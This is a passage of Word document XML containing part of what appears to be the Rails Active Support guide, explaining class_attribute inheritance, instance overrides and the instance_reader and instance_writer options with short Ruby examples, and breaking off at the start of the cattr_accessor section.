        <w:t xml:space="preserve"> declares one or more inheritable class attributes that can be overridden at any level down the hierarchy.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2640"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="60F75BDF" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="535009DD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>A</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4097515B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  class_attribute :x</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0818E362" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DD7D97A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CBF03F9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>B</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt; A; end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67083B73" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41DD9C5E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>C</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt; B; end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DC4AA12" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CBD7245" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>A.x = :a</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7AD5931C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>B.x # =&gt; :a</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E799567" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>C.x # =&gt; :a</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4965708D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="539BACDC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>B.x = :b</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16435362" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>A.x # =&gt; :a</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2FE299D0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>C.x # =&gt; :b</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="233397C8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D52979F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>C.x = :c</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="348F5893" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>A.x # =&gt; :a</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A45C083" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>B.x # =&gt; :b</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0C8C64A3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For example </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionMailer::Base</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> defines:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7880"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="43C88894" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="00FD86E7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class_attribute :default_params</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="192CFC8D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>self.default_params = {</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DE15C47" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :mime_version</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "1.0",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="799DF7D4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :charset</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">      </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "UTF-8",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C397521" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :content_type</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "text/plain",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="034F493C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :parts_order</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; [ "text/plain", "text/enriched", "text/html"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13B938E6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>}.freeze</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7F2C6902" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>They can be also accessed and overridden at the instance level.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3480"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6E94AB1C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="65C56A5C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>A.x = 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="618E3658" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27C7AF87" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>a1 = A.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32A5948D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>a2 = A.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1540BC24" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>a2.x = 2</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F7E7F87" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62EF3EB3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>a1.x # =&gt; 1, comes from A</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F453F28" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>a2.x # =&gt; 2, overridden in a2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5875393F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The generation of the writer instance method can be prevented by setting the option </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:instance_writer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8208"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7109B931" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="24220B44" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActiveRecord</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49170053" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12745B14" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    class_attribute :table_name_prefix, :instance_writer</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14D6C976" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    self.table_name_prefix = ""</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EFB7A61" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60928BCA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1D1293D3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>A model may find that option useful as a way to prevent mass-assignment from setting the attribute.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CBDC56A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The generation of the reader instance method can be prevented by setting the option </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:instance_reader</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5808"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="51799468" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="474B6373" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>A</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32331B01" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  class_attribute :x, :instance_reader</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D9FC23D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24EB85F0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A7E11B0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>A.new.x = 1</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># NoMethodError</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="403F4335" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For convenience </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>class_attribute</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> also defines an instance predicate which is the double negation of what the instance reader returns. In the examples above it would be called </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>x?</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56021188" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:instance_reader</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, the instance predicate returns a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>NoMethodError</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> just like the reader method.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="286780F9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/class/attribute.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25CB9FE2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>cattr_reader</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>cattr_writer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>cattr_accessor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC16943" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The macros </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>cattr_reader</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>cattr_writer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>cattr_accessor</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are analogous to their </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attr_*</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> counterparts but for classes. They initialize a class variable to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> unless it already exists, and generate the corresponding class methods to access it:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7080"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5DAFB554" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="09EFDFBF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
